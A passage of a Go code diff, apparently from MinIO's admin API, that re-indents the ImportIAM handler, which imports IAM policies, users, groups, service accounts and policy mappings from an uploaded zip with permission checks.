exportError(ctx, err, iamFile, \"\"), r.URL)\n+                                return\n+                        }\n+                }\n+        }\n }\n \n // ImportIAM - imports all IAM info into MinIO\n func (a adminAPIHandlers) ImportIAM(w http.ResponseWriter, r *http.Request) {\n-\tctx := r.Context()\n-\n-\t// Get current object layer instance.\n-\tobjectAPI := newObjectLayerFn()\n-\tif objectAPI == nil || globalNotificationSys == nil {\n-\t\twriteErrorResponseJSON(ctx, w, errorCodes.ToAPIErr(ErrServerNotInitialized), r.URL)\n-\t\treturn\n-\t}\n-\tcred, owner, s3Err := validateAdminSignature(ctx, r, \"\")\n-\tif s3Err != ErrNone {\n-\t\twriteErrorResponseJSON(ctx, w, errorCodes.ToAPIErr(s3Err), r.URL)\n-\t\treturn\n-\t}\n-\tdata, err := io.ReadAll(r.Body)\n-\tif err != nil {\n-\t\twriteErrorResponseJSON(ctx, w, errorCodes.ToAPIErr(ErrInvalidRequest), r.URL)\n-\t\treturn\n-\t}\n-\treader := bytes.NewReader(data)\n-\tzr, err := zip.NewReader(reader, int64(len(data)))\n-\tif err != nil {\n-\t\twriteErrorResponseJSON(ctx, w, errorCodes.ToAPIErr(ErrInvalidRequest), r.URL)\n-\t\treturn\n-\t}\n-\t// import policies first\n-\t{\n-\n-\t\tf, err := zr.Open(pathJoin(iamAssetsDir, allPoliciesFile))\n-\t\tswitch {\n-\t\tcase errors.Is(err, os.ErrNotExist):\n-\t\tcase err != nil:\n-\t\t\twriteErrorResponseJSON(ctx, w, importErrorWithAPIErr(ctx, ErrInvalidRequest, err, allPoliciesFile, \"\"), r.URL)\n-\t\t\treturn\n-\t\tdefault:\n-\t\t\tdefer f.Close()\n-\t\t\tvar allPolicies map[string]policy.Policy\n-\t\t\tdata, err = io.ReadAll(f)\n-\t\t\tif err != nil {\n-\t\t\t\twriteErrorResponseJSON(ctx, w, importErrorWithAPIErr(ctx, ErrInvalidRequest, err, allPoliciesFile, \"\"), r.URL)\n-\t\t\t\treturn\n-\t\t\t}\n-\t\t\terr = json.Unmarshal(data, &allPolicies)\n-\t\t\tif err != nil {\n-\t\t\t\twriteErrorResponseJSON(ctx, w, importErrorWithAPIErr(ctx, ErrAdminConfigBadJSON, err, allPoliciesFile, \"\"), r.URL)\n-\t\t\t\treturn\n-\t\t\t}\n-\t\t\tfor policyName, policy := range allPolicies {\n-\t\t\t\tif policy.IsEmpty() {\n-\t\t\t\t\terr = globalIAMSys.DeletePolicy(ctx, policyName, true)\n-\t\t\t\t} else {\n-\t\t\t\t\t_, err = globalIAMSys.SetPolicy(ctx, policyName, policy)\n-\t\t\t\t}\n-\t\t\t\tif err != nil {\n-\t\t\t\t\twriteErrorResponseJSON(ctx, w, importError(ctx, err, allPoliciesFile, policyName), r.URL)\n-\t\t\t\t\treturn\n-\t\t\t\t}\n-\t\t\t}\n-\t\t}\n-\t}\n-\n-\t// import users\n-\t{\n-\t\tf, err := zr.Open(pathJoin(iamAssetsDir, allUsersFile))\n-\t\tswitch {\n-\t\tcase errors.Is(err, os.ErrNotExist):\n-\t\tcase err != nil:\n-\t\t\twriteErrorResponseJSON(ctx, w, importErrorWithAPIErr(ctx, ErrInvalidRequest, err, allUsersFile, \"\"), r.URL)\n-\t\t\treturn\n-\t\tdefault:\n-\t\t\tdefer f.Close()\n-\t\t\tvar userAccts map[string]madmin.AddOrUpdateUserReq\n-\t\t\tdata, err := io.ReadAll(f)\n-\t\t\tif err != nil {\n-\t\t\t\twriteErrorResponseJSON(ctx, w, importErrorWithAPIErr(ctx, ErrInvalidRequest, err, allUsersFile, \"\"), r.URL)\n-\t\t\t\treturn\n-\t\t\t}\n-\t\t\terr = json.Unmarshal(data, &userAccts)\n-\t\t\tif err != nil {\n-\t\t\t\twriteErrorResponseJSON(ctx, w, importErrorWithAPIErr(ctx, ErrAdminConfigBadJSON, err, allUsersFile, \"\"), r.URL)\n-\t\t\t\treturn\n-\t\t\t}\n-\t\t\tfor accessKey, ureq := range userAccts {\n-\t\t\t\t// Not allowed to add a user with same access key as root credential\n-\t\t\t\tif accessKey == globalActiveCred.AccessKey {\n-\t\t\t\t\twriteErrorResponseJSON(ctx, w, importErrorWithAPIErr(ctx, ErrAddUserInvalidArgument, err, allUsersFile, accessKey), r.URL)\n-\t\t\t\t\treturn\n-\t\t\t\t}\n-\n-\t\t\t\tuser, exists := globalIAMSys.GetUser(ctx, accessKey)\n-\t\t\t\tif exists && (user.Credentials.IsTemp() || user.Credentials.IsServiceAccount()) {\n-\t\t\t\t\t// Updating STS credential is not allowed, and this API does not\n-\t\t\t\t\t// support updating service accounts.\n-\t\t\t\t\twriteErrorResponseJSON(ctx, w, importErrorWithAPIErr(ctx, ErrAddUserInvalidArgument, err, allUsersFile, accessKey), r.URL)\n-\t\t\t\t\treturn\n-\t\t\t\t}\n-\n-\t\t\t\tif (cred.IsTemp() || cred.IsServiceAccount()) && cred.ParentUser == accessKey {\n-\t\t\t\t\t// Incoming access key matches parent user then we should\n-\t\t\t\t\t// reject password change requests.\n-\t\t\t\t\twriteErrorResponseJSON(ctx, w, importErrorWithAPIErr(ctx, ErrAddUserInvalidArgument, err, allUsersFile, accessKey), r.URL)\n-\t\t\t\t\treturn\n-\t\t\t\t}\n-\n-\t\t\t\t// Check if accessKey has beginning and end space characters, this only applies to new users.\n-\t\t\t\tif !exists && hasSpaceBE(accessKey) {\n-\t\t\t\t\twriteErrorResponseJSON(ctx, w, importErrorWithAPIErr(ctx, ErrAdminResourceInvalidArgument, err, allUsersFile, accessKey), r.URL)\n-\t\t\t\t\treturn\n-\t\t\t\t}\n-\n-\t\t\t\tcheckDenyOnly := false\n-\t\t\t\tif accessKey == cred.AccessKey {\n-\t\t\t\t\t// Check that there is no explicit deny - otherwise it's allowed\n-\t\t\t\t\t// to change one's own password.\n-\t\t\t\t\tcheckDenyOnly = true\n-\t\t\t\t}\n-\n-\t\t\t\tif !globalIAMSys.IsAllowed(policy.Args{\n-\t\t\t\t\tAccountName:     cred.AccessKey,\n-\t\t\t\t\tGroups:          cred.Groups,\n-\t\t\t\t\tAction:          policy.CreateUserAdminAction,\n-\t\t\t\t\tConditionValues: getConditionValues(r, \"\", cred),\n-\t\t\t\t\tIsOwner:         owner,\n-\t\t\t\t\tClaims:          cred.Claims,\n-\t\t\t\t\tDenyOnly:        checkDenyOnly,\n-\t\t\t\t}) {\n-\t\t\t\t\twriteErrorResponseJSON(ctx, w, importErrorWithAPIErr(ctx, ErrAccessDenied, err, allUsersFile, accessKey), r.URL)\n-\t\t\t\t\treturn\n-\t\t\t\t}\n-\t\t\t\tif _, err = globalIAMSys.CreateUser(ctx, accessKey, ureq); err != nil {\n-\t\t\t\t\twriteErrorResponseJSON(ctx, w, importErrorWithAPIErr(ctx, toAdminAPIErrCode(ctx, err), err, allUsersFile, accessKey), r.URL)\n-\t\t\t\t\treturn\n-\t\t\t\t}\n-\n-\t\t\t}\n-\t\t}\n-\t}\n-\n-\t// import groups\n-\t{\n-\t\tf, err := zr.Open(pathJoin(iamAssetsDir, allGroupsFile))\n-\t\tswitch {\n-\t\tcase errors.Is(err, os.ErrNotExist):\n-\t\tcase err != nil:\n-\t\t\twriteErrorResponseJSON(ctx, w, importErrorWithAPIErr(ctx, ErrInvalidRequest, err, allGroupsFile, \"\"), r.URL)\n-\t\t\treturn\n-\t\tdefault:\n-\t\t\tdefer f.Close()\n-\t\t\tvar grpInfos map[string]GroupInfo\n-\t\t\tdata, err := io.ReadAll(f)\n-\t\t\tif err != nil {\n-\t\t\t\twriteErrorResponseJSON(ctx, w, importErrorWithAPIErr(ctx, ErrInvalidRequest, err, allGroupsFile, \"\"), r.URL)\n-\t\t\t\treturn\n-\t\t\t}\n-\t\t\tif err = json.Unmarshal(data, &grpInfos); err != nil {\n-\t\t\t\twriteErrorResponseJSON(ctx, w, importErrorWithAPIErr(ctx, ErrAdminConfigBadJSON, err, allGroupsFile, \"\"), r.URL)\n-\t\t\t\treturn\n-\t\t\t}\n-\t\t\tfor group, grpInfo := range grpInfos {\n-\t\t\t\t// Check if group already exists\n-\t\t\t\tif _, gerr := globalIAMSys.GetGroupDescription(group); gerr != nil {\n-\t\t\t\t\t// If group does not exist, then check if the group has beginning and end space characters\n-\t\t\t\t\t// we will reject such group names.\n-\t\t\t\t\tif errors.Is(gerr, errNoSuchGroup) && hasSpaceBE(group) {\n-\t\t\t\t\t\twriteErrorResponseJSON(ctx, w, importErrorWithAPIErr(ctx, ErrAdminResourceInvalidArgument, err, allGroupsFile, group), r.URL)\n-\t\t\t\t\t\treturn\n-\t\t\t\t\t}\n-\t\t\t\t}\n-\t\t\t\tif _, gerr := globalIAMSys.AddUsersToGroup(ctx, group, grpInfo.Members); gerr != nil {\n-\t\t\t\t\twriteErrorResponseJSON(ctx, w, importError(ctx, err, allGroupsFile, group), r.URL)\n-\t\t\t\t\treturn\n-\t\t\t\t}\n-\t\t\t}\n-\t\t}\n-\t}\n-\n-\t// import service accounts\n-\t{\n-\t\tf, err := zr.Open(pathJoin(iamAssetsDir, allSvcAcctsFile))\n-\t\tswitch {\n-\t\tcase errors.Is(err, os.ErrNotExist):\n-\t\tcase err != nil:\n-\t\t\twriteErrorResponseJSON(ctx, w, importErrorWithAPIErr(ctx, ErrInvalidRequest, err, allSvcAcctsFile, \"\"), r.URL)\n-\t\t\treturn\n-\t\tdefault:\n-\t\t\tdefer f.Close()\n-\t\t\tvar serviceAcctReqs map[string]madmin.SRSvcAccCreate\n-\t\t\tdata, err := io.ReadAll(f)\n-\t\t\tif err != nil {\n-\t\t\t\twriteErrorResponseJSON(ctx, w, importErrorWithAPIErr(ctx, ErrInvalidRequest, err, allSvcAcctsFile, \"\"), r.URL)\n-\t\t\t\treturn\n-\t\t\t}\n-\t\t\tif err = json.Unmarshal(data, &serviceAcctReqs); err != nil {\n-\t\t\t\twriteErrorResponseJSON(ctx, w, importErrorWithAPIErr(ctx, ErrAdminConfigBadJSON, err, allSvcAcctsFile, \"\"), r.URL)\n-\t\t\t\treturn\n-\t\t\t}\n-\t\t\tfor user, svcAcctReq := range serviceAcctReqs {\n-\t\t\t\tvar sp *policy.Policy\n-\t\t\t\tvar err error\n-\t\t\t\tif len(svcAcctReq.SessionPolicy) > 0 {\n-\t\t\t\t\tsp, err = policy.ParseConfig(bytes.NewReader(svcAcctReq.SessionPolicy))\n-\t\t\t\t\tif err != nil {\n-\t\t\t\t\t\twriteErrorResponseJSON(ctx, w, importError(ctx, err, allSvcAcctsFile, user), r.URL)\n-\t\t\t\t\t\treturn\n-\t\t\t\t\t}\n-\t\t\t\t}\n-\t\t\t\t// service account access key cannot have space characters beginning and end of the string.\n-\t\t\t\tif hasSpaceBE(svcAcctReq.AccessKey) {\n-\t\t\t\t\twriteErrorResponseJSON(ctx, w, errorCodes.ToAPIErr(ErrAdminResourceInvalidArgument), r.URL)\n-\t\t\t\t\treturn\n-\t\t\t\t}\n-\t\t\t\tif !globalIAMSys.IsAllowed(policy.Args{\n-\t\t\t\t\tAccountName:     cred.AccessKey,\n-\t\t\t\t\tGroups:          cred.Groups,\n-\t\t\t\t\tAction:          policy.CreateServiceAccountAdminAction,\n-\t\t\t\t\tConditionValues: getConditionValues(r, \"\", cred),\n-\t\t\t\t\tIsOwner:         owner,\n-\t\t\t\t\tClaims:          cred.Claims,\n-\t\t\t\t}) {\n-\t\t\t\t\twriteErrorResponseJSON(ctx, w, importErrorWithAPIErr(ctx, ErrAccessDenied, err, allSvcAcctsFile, user), r.URL)\n-\t\t\t\t\treturn\n-\t\t\t\t}\n-\t\t\t\tupdateReq := true\n-\t\t\t\t_, _, err = globalIAMSys.GetServiceAccount(ctx, svcAcctReq.AccessKey)\n-\t\t\t\tif err != nil {\n-\t\t\t\t\tif !errors.Is(err, errNoSuchServiceAccount) {\n-\t\t\t\t\t\twriteErrorResponseJSON(ctx, w, importError(ctx, err, allSvcAcctsFile, user), r.URL)\n-\t\t\t\t\t\treturn\n-\t\t\t\t\t}\n-\t\t\t\t\tupdateReq = false\n-\t\t\t\t}\n-\t\t\t\tif updateReq {\n-\t\t\t\t\topts := updateServiceAccountOpts{\n-\t\t\t\t\t\tsecretKey:     svcAcctReq.SecretKey,\n-\t\t\t\t\t\tstatus:        svcAcctReq.Status,\n-\t\t\t\t\t\tname:          svcAcctReq.Name,\n-\t\t\t\t\t\tdescription:   svcAcctReq.Description,\n-\t\t\t\t\t\texpiration:    svcAcctReq.Expiration,\n-\t\t\t\t\t\tsessionPolicy: sp,\n-\t\t\t\t\t}\n-\t\t\t\t\t_, err = globalIAMSys.UpdateServiceAccount(ctx, svcAcctReq.AccessKey, opts)\n-\t\t\t\t\tif err != nil {\n-\t\t\t\t\t\twriteErrorResponseJSON(ctx, w, importError(ctx, err, allSvcAcctsFile, user), r.URL)\n-\t\t\t\t\t\treturn\n-\t\t\t\t\t}\n-\t\t\t\t\tcontinue\n-\t\t\t\t}\n-\t\t\t\topts := newServiceAccountOpts{\n-\t\t\t\t\taccessKey:                  user,\n-\t\t\t\t\tsecretKey:                  svcAcctReq.SecretKey,\n-\t\t\t\t\tsessionPolicy:              sp,\n-\t\t\t\t\tclaims:                     svcAcctReq.Claims,\n-\t\t\t\t\tname:                       svcAcctReq.Name,\n-\t\t\t\t\tdescription:                svcAcctReq.Description,\n-\t\t\t\t\texpiration:                 svcAcctReq.Expiration,\n-\t\t\t\t\tallowSiteReplicatorAccount: false,\n-\t\t\t\t}\n-\n-\t\t\t\t// In case of LDAP we need to resolve the targetUser to a DN and\n-\t\t\t\t// query their groups:\n-\t\t\t\tif globalIAMSys.LDAPConfig.Enabled() {\n-\t\t\t\t\topts.claims[ldapUserN] = svcAcctReq.AccessKey // simple username\n-\t\t\t\t\ttargetUser, _, err := globalIAMSys.LDAPConfig.LookupUserDN(svcAcctReq.AccessKey)\n-\t\t\t\t\tif err != nil {\n-\t\t\t\t\t\twriteErrorResponseJSON(ctx, w, importError(ctx, err, allSvcAcctsFile, user), r.URL)\n-\t\t\t\t\t\treturn\n-\t\t\t\t\t}\n-\t\t\t\t\topts.claims[ldapUser] = targetUser // username DN\n-\t\t\t\t}\n-\n-\t\t\t\tif _, _, err = globalIAMSys.NewServiceAccount(ctx, svcAcctReq.Parent, svcAcctReq.Groups, opts); err != nil {\n-\t\t\t\t\twriteErrorResponseJSON(ctx, w, importError(ctx, err, allSvcAcctsFile, user), r.URL)\n-\t\t\t\t\treturn\n-\t\t\t\t}\n-\n-\t\t\t}\n-\t\t}\n-\t}\n-\n-\t// import user policy mappings\n-\t{\n-\t\tf, err := zr.Open(pathJoin(iamAssetsDir, userPolicyMappingsFile))\n-\t\tswitch {\n-\t\tcase errors.Is(err, os.ErrNotExist):\n-\t\tcase err != nil:\n-\t\t\twriteErrorResponseJSON(ctx, w, importErrorWithAPIErr(ctx, ErrInvalidRequest, err, userPolicyMappingsFile, \"\"), r.URL)\n-\t\t\treturn\n-\t\tdefault:\n-\t\t\tdefer f.Close()\n-\t\t\tvar userPolicyMap map[string]MappedPolicy\n-\t\t\tdata, err := io.ReadAll(f)\n-\t\t\tif err != nil {\n-\t\t\t\twriteErrorResponseJSON(ctx, w, importErrorWithAPIErr(ctx, ErrInvalidRequest, err, userPolicyMappingsFile, \"\"), r.URL)\n-\t\t\t\treturn\n-\t\t\t}\n-\t\t\tif err = json.Unmarshal(data, &userPolicyMap); err != nil {\n-\t\t\t\twriteErrorResponseJSON(ctx, w, importErrorWithAPIErr(ctx, ErrAdminConfigBadJSON, err, userPolicyMappingsFile, \"\"), r.URL)\n-\t\t\t\treturn\n-\t\t\t}\n-\t\t\tfor u, pm := range userPolicyMap {\n-\t\t\t\t// disallow setting policy mapping if user is a temporary user\n-\t\t\t\tok, _, err := globalIAMSys.IsTempUser(u)\n-\t\t\t\tif err != nil && err != errNoSuchUser {\n-\t\t\t\t\twriteErrorResponseJSON(ctx, w, importError(ctx, err, userPolicyMappingsFile, u), r.URL)\n-\t\t\t\t\treturn\n-\t\t\t\t}\n-\t\t\t\tif ok {\n-\t\t\t\t\twriteErrorResponseJSON(ctx, w, importError(ctx, errIAMActionNotAllowed, userPolicyMappingsFile, u), r.URL)\n-\t\t\t\t\treturn\n-\t\t\t\t}\n-\t\t\t\tif _, err := globalIAMSys.PolicyDBSet(ctx, u, pm.Policies, regUser, false); err != nil {\n-\t\t\t\t\twriteErrorResponseJSON(ctx, w, importError(ctx, err, userPolicyMappingsFile, u), r.URL)\n-\t\t\t\t\treturn\n-\t\t\t\t}\n-\t\t\t}\n-\t\t}\n-\t}\n-\n-\t// import group policy mappings\n-\t{\n-\t\tf, err := zr.Open(pathJoin(iamAssetsDir, groupPolicyMappingsFile))\n-\t\tswitch {\n-\t\tcase errors.Is(err, os.ErrNotExist):\n-\t\tcase err != nil:\n-\t\t\twriteErrorResponseJSON(ctx, w, importErrorWithAPIErr(ctx, ErrInvalidRequest, err, groupPolicyMappingsFile, \"\"), r.URL)\n-\t\t\treturn\n-\t\tdefault:\n-\t\t\tdefer f.Close()\n-\t\t\tvar grpPolicyMap map[string]MappedPolicy\n-\t\t\tdata, err := io.ReadAll(f)\n-\t\t\tif err != nil {\n-\t\t\t\twriteErrorResponseJSON(ctx, w, importErrorWithAPIErr(ctx, ErrInvalidRequest, err, groupPolicyMappingsFile, \"\"), r.URL)\n-\t\t\t\treturn\n-\t\t\t}\n-\t\t\tif err = json.Unmarshal(data, &grpPolicyMap); err != nil {\n-\t\t\t\twriteErrorResponseJSON(ctx, w, importErrorWithAPIErr(ctx, ErrAdminConfigBadJSON, err, groupPolicyMappingsFile, \"\"), r.URL)\n-\t\t\t\treturn\n-\t\t\t}\n-\t\t\tfor g, pm := range grpPolicyMap {\n-\t\t\t\tif _, err := globalIAMSys.PolicyDBSet(ctx, g, pm.Policies, unknownIAMUserType, true); err != nil {\n-\t\t\t\t\twriteErrorResponseJSON(ctx, w, importError(ctx, err, groupPolicyMappingsFile, g), r.URL)\n-\t\t\t\t\treturn\n-\t\t\t\t}\n-\t\t\t}\n-\t\t}\n-\t}\n-\n-\t// import sts user policy mappings\n-\t{\n-\t\tf, err := zr.Open(pathJoin(iamAssetsDir, stsUserPolicyMappingsFile))\n-\t\tswitch {\n-\t\tcase errors.Is(err, os.ErrNotExist):\n-\t\tcase err != nil:\n-\t\t\twriteErrorResponseJSON(ctx, w, importErrorWithAPIErr(ctx, ErrInvalidRequest, err, stsUserPolicyMappingsFile, \"\"), r.URL)\n-\t\t\treturn\n-\t\tdefault:\n-\t\t\tdefer f.Close()\n-\t\t\tvar userPolicyMap map[string]MappedPolicy\n-\t\t\tdata, err := io.ReadAll(f)\n-\t\t\tif err != nil {\n-\t\t\t\twriteErrorResponseJSON(ctx, w, importErrorWithAPIErr(ctx, ErrInvalidRequest, err, stsUserPolicyMappingsFile, \"\"), r.URL)\n-\t\t\t\treturn\n-\t\t\t}\n-\t\t\tif err = json.Unmarshal(data, &userPolicyMap); err != nil {\n-\t\t\t\twriteErrorResponseJSON(ctx, w, importErrorWithAPIErr(ctx, ErrAdminConfigBadJSON, err, stsUserPolicyMappingsFile, \"\"), r.URL)\n-\t\t\t\treturn\n-\t\t\t}\n-\t\t\tfor u, pm := range userPolicyMap {\n-\t\t\t\t// disallow setting policy mapping if user is a temporary user\n-\t\t\t\tok, _, err := globalIAMSys.IsTempUser(u)\n-\t\t\t\tif err != nil && err != errNoSuchUser {\n-\t\t\t\t\twriteErrorResponseJSON(ctx, w, importError(ctx, err, stsUserPolicyMappingsFile, u), r.URL)\n-\t\t\t\t\treturn\n-\t\t\t\t}\n-\t\t\t\tif ok {\n-\t\t\t\t\twriteErrorResponseJSON(ctx, w, importError(ctx, errIAMActionNotAllowed, stsUserPolicyMappingsFile, u), r.URL)\n-\t\t\t\t\treturn\n-\t\t\t\t}\n-\t\t\t\tif _, err := globalIAMSys.PolicyDBSet(ctx, u, pm.Policies, stsUser, false); err != nil {\n-\t\t\t\t\twriteErrorResponseJSON(ctx, w, importError(ctx, err, stsUserPolicyMappingsFile, u), r.URL)\n-\t\t\t\t\treturn\n-\t\t\t\t}\n-\t\t\t}\n-\t\t}\n-\t}\n-\n-\t// import sts group policy mappings\n-\t{\n-\t\tf, err := zr.Open(pathJoin(iamAssetsDir, stsGroupPolicyMappingsFile))\n-\t\tswitch {\n-\t\tcase errors.Is(err, os.ErrNotExist):\n-\t\tcase err != nil:\n-\t\t\twriteErrorResponseJSON(ctx, w, importErrorWithAPIErr(ctx, ErrInvalidRequest, err, stsGroupPolicyMappingsFile, \"\"), r.URL)\n-\t\t\treturn\n-\t\tdefault:\n-\t\t\tdefer f.Close()\n-\t\t\tvar grpPolicyMap map[string]MappedPolicy\n-\t\t\tdata, err := io.ReadAll(f)\n-\t\t\tif err != nil {\n-\t\t\t\twriteErrorResponseJSON(ctx, w, importErrorWithAPIErr(ctx, ErrInvalidRequest, err, stsGroupPolicyMappingsFile, \"\"), r.URL)\n-\t\t\t\treturn\n-\t\t\t}\n-\t\t\tif err = json.Unmarshal(data, &grpPolicyMap); err != nil {\n-\t\t\t\twriteErrorResponseJSON(ctx, w, importErrorWithAPIErr(ctx, ErrAdminConfigBadJSON, err, stsGroupPolicyMappingsFile, \"\"), r.URL)\n-\t\t\t\treturn\n-\t\t\t}\n-\t\t\tfor g, pm := range grpPolicyMap {\n-\t\t\t\tif _, err := globalIAMSys.PolicyDBSet(ctx, g, pm.Policies, unknownIAMUserType, true); err != nil {\n-\t\t\t\t\twriteErrorResponseJSON(ctx, w, importError(ctx, err, stsGroupPolicyMappingsFile, g), r.URL)\n-\t\t\t\t\treturn\n-\t\t\t\t}\n-\t\t\t}\n-\t\t}\n-\t}\n+        ctx := r.Context()\n+\n+        // Get current object layer instance.\n+        objectAPI := newObjectLayerFn()\n+        if objectAPI == nil || globalNotificationSys == nil {\n+                writeErrorResponseJSON(ctx, w, errorCodes.ToAPIErr(ErrServerNotInitialized), r.URL)\n+                return\n+        }\n+        cred, owner, s3Err := validateAdminSignature(ctx, r, \"\")\n+        if s3Err != ErrNone {\n+                writeErrorResponseJSON(ctx, w, errorCodes.ToAPIErr(s3Err), r.URL)\n+                return\n+        }\n+        data, err := io.ReadAll(r.Body)\n+        if err != nil {\n+                writeErrorResponseJSON(ctx, w, errorCodes.ToAPIErr(ErrInvalidRequest), r.URL)\n+                return\n+        }\n+        reader := bytes.NewReader(data)\n+        zr, err := zip.NewReader(reader, int64(len(data)))\n+        if err != nil {\n+                writeErrorResponseJSON(ctx, w, errorCodes.ToAPIErr(ErrInvalidRequest), r.URL)\n+                return\n+        }\n+        // import policies first\n+        {\n+\n+                f, err := zr.Open(pathJoin(iamAssetsDir, allPoliciesFile))\n+                switch {\n+                case errors.Is(err, os.ErrNotExist):\n+                case err != nil:\n+                        writeErrorResponseJSON(ctx, w, importErrorWithAPIErr(ctx, ErrInvalidRequest, err, allPoliciesFile, \"\"), r.URL)\n+                        return\n+                default:\n+                        defer f.Close()\n+                        var allPolicies map[string]policy.Policy\n+                        data, err = io.ReadAll(f)\n+                        if err != nil {\n+                                writeErrorResponseJSON(ctx, w, importErrorWithAPIErr(ctx, ErrInvalidRequest, err, allPoliciesFile, \"\"), r.URL)\n+                                return\n+                        }\n+                        err = json.Unmarshal(data, &allPolicies)\n+                        if err != nil {\n+                                writeErrorResponseJSON(ctx, w, importErrorWithAPIErr(ctx, ErrAdminConfigBadJSON, err, allPoliciesFile, \"\"), r.URL)\n+                                return\n+                        }\n+                        for policyName, policy := range allPolicies {\n+                                if policy.IsEmpty() {\n+                                        err = globalIAMSys.DeletePolicy(ctx, policyName, true)\n+                                } else {\n+                                        _, err = globalIAMSys.SetPolicy(ctx, policyName, policy)\n+                                }\n+                                if err != nil {\n+                                        writeErrorResponseJSON(ctx, w, importError(ctx, err, allPoliciesFile, policyName), r.URL)\n+                                        return\n+                                }\n+                        }\n+                }\n+        }\n+\n+        // import users\n+        {\n+                f, err := zr.Open(pathJoin(iamAssetsDir, allUsersFile))\n+                switch {\n+                case errors.Is(err, os.ErrNotExist):\n+                case err != nil:\n+                        writeErrorResponseJSON(ctx, w, importErrorWithAPIErr(ctx, ErrInvalidRequest, err, allUsersFile, \"\"), r.URL)\n+                        return\n+                default:\n+                        defer f.Close()\n+                        var userAccts map[string]madmin.AddOrUpdateUserReq\n+                        data, err := io.ReadAll(f)\n+                        if err != nil {\n+                                writeErrorResponseJSON(ctx, w, importErrorWithAPIErr(ctx, ErrInvalidRequest, err, allUsersFile, \"\"), r.URL)\n+                                return\n+                        }\n+                        err = json.Unmarshal(data, &userAccts)\n+                        if err != nil {\n+                                writeErrorResponseJSON(ctx, w, importErrorWithAPIErr(ctx, ErrAdminConfigBadJSON, err, allUsersFile, \"\"), r.URL)\n+                                return\n+                        }\n+                        for accessKey, ureq := range userAccts {\n+                                // Not allowed to add a user with same access key as root credential\n+                                if accessKey == globalActiveCred.AccessKey {\n+                                        writeErrorResponseJSON(ctx, w, importErrorWithAPIErr(ctx, ErrAddUserInvalidArgument, err, allUsersFile, accessKey), r.URL)\n+                                        return\n+                                }\n+\n+                                user, exists := globalIAMSys.GetUser(ctx, accessKey)\n+                                if exists && (user.Credentials.IsTemp() || user.Credentials.IsServiceAccount()) {\n+                                        // Updating STS credential is not allowed, and this API does not\n+                                        // support updating service accounts.\n+                                        writeErrorResponseJSON(ctx, w, importErrorWithAPIErr(ctx, ErrAddUserInvalidArgument, err, allUsersFile, accessKey), r.URL)\n+                                        return\n+                                }\n+\n+                                if (cred.IsTemp() || cred.IsServiceAccount()) && cred.ParentUser == accessKey {\n+                                        // Incoming access key matches parent user then we should\n+                                        // reject password change requests.\n+                                        writeErrorResponseJSON(ctx, w, importErrorWithAPIErr(ctx, ErrAddUserInvalidArgument, err, allUsersFile, accessKey), r.URL)\n+                                        return\n+                                }\n+\n+                                // Check if accessKey has beginning and end space characters, this only applies to new users.\n+                                if !exists && hasSpaceBE(accessKey) {\n+                                        writeErrorResponseJSON(ctx, w, importErrorWithAPIErr(ctx, ErrAdminResourceInvalidArgument, err, allUsersFile, accessKey), r.URL)\n+                                        return\n+                                }\n+\n+                                checkDenyOnly := false\n+                                if accessKey == cred.AccessKey {\n+                                        // Check that there is no explicit deny - otherwise it's allowed\n+                                        // to change one's own password.\n+                                        checkDenyOnly = true\n+                                }\n+\n+                                if !globalIAMSys.IsAllowed(policy.Args{\n+                                        AccountName:     cred.AccessKey,\n+                                        Groups:          cred.Groups,\n+                                        Action:          policy.CreateUserAdminAction,\n+                                        ConditionValues: getConditionValues(r, \"\", cred),\n+                                        IsOwner:         owner,\n+                                        Claims:          cred.Claims,\n+                                        DenyOnly:        checkDenyOnly,\n+                                }) {\n+                                        writeErrorResponseJSON(ctx, w, importErrorWithAPIErr(ctx, ErrAccessDenied, err, allUsersFile, accessKey), r.URL)\n+                                        return\n+                                }\n+                                if _, err = globalIAMSys.CreateUser(ctx, accessKey, ureq); err != nil {\n+                                        writeErrorResponseJSON(ctx, w, importErrorWithAPIErr(ctx, toAdminAPIErrCode(ctx, err), err, allUsersFile, accessKey), r.URL)\n+                                        return\n+                                }\n+\n+                        }\n+                }\n+        }\n+\n+        // import groups\n+        {\n+                f, err := zr.Open(pathJoin(iamAssetsDir, allGroupsFile))\n+                switch {\n+                case errors.Is(err, os.ErrNotExist):\n+                case err != nil:\n+                        writeErrorResponseJSON(ctx, w, importErrorWithAPIErr(ctx, ErrInvalidRequest, err, allGroupsFile, \"\"), r.URL)\n+                        return\n+                default:\n+                        defer f.Close()\n+                        var grpInfos map[string]GroupInfo\n+                        data, err := io.ReadAll(f)\n+                        if err != nil {\n+                                writeErrorResponseJSON(ctx, w, importErrorWithAPIErr(ctx, ErrInvalidRequest, err, allGroupsFile, \"\"), r.URL)\n+                                return\n+                        }\n+                        if err = json.Unmarshal(data, &grpInfos); err != nil {\n+                                writeErrorResponseJSON(ctx, w, importErrorWithAPIErr(ctx, ErrAdminConfigBadJSON, err, allGroupsFile, \"\"), r.URL)\n+                                return\n+                        }\n+                        for group, grpInfo := range grpInfos {\n+                                // Check if group already exists\n+                                if _, gerr := globalIAMSys.GetGroupDescription(group); gerr != nil {\n+                                        // If group does not exist, then check if the group has beginning and end space characters\n+                                        // we will reject such group names.\n+                                        if errors.Is(gerr, errNoSuchGroup) && hasSpaceBE(group) {\n+                                                writeErrorResponseJSON(ctx, w, importErrorWithAPIErr(ctx, ErrAdminResourceInvalidArgument, err, allGroupsFile, group), r.URL)\n+                                                return\n+                                        }\n+                                }\n+                                if _, gerr := globalIAMSys.AddUsersToGroup(ctx, group, grpInfo.Members); gerr != nil {\n+                                        writeErrorResponseJSON(ctx, w, importError(ctx, err, allGroupsFile, group), r.URL)\n+                                        return\n+                                }\n+                        }\n+                }\n+        }\n+\n+        // import service accounts\n+        {\n+                f, err := zr.Open(pathJoin(iamAssetsDir, allSvcAcctsFile))\n+                switch {\n+                case errors.Is(err, os.ErrNotExist):\n+                case err != nil:\n+                        writeErrorResponseJSON(ctx, w, importErrorWithAPIErr(ctx, ErrInvalidRequest, err, allSvcAcctsFile, \"\"), r.URL)\n+                        return\n+                default:\n+                        defer f.Close()\n+                        var serviceAcctReqs map[string]madmin.SRSvcAccCreate\n+                        data, err := io.ReadAll(f)\n+                        if err != nil {\n+                                writeErrorResponseJSON(ctx, w, importErrorWithAPIErr(ctx, ErrInvalidRequest, err, allSvcAcctsFile, \"\"), r.URL)\n+                                return\n+                        }\n+                        if err = json.Unmarshal(data, &serviceAcctReqs); err != nil {\n+                                writeErrorResponseJSON(ctx, w, importErrorWithAPIErr(ctx, ErrAdminConfigBadJSON, err, allSvcAcctsFile, \"\"), r.URL)\n+                                return\n+                        }\n+                        for user, svcAcctReq := range serviceAcctReqs {\n+                                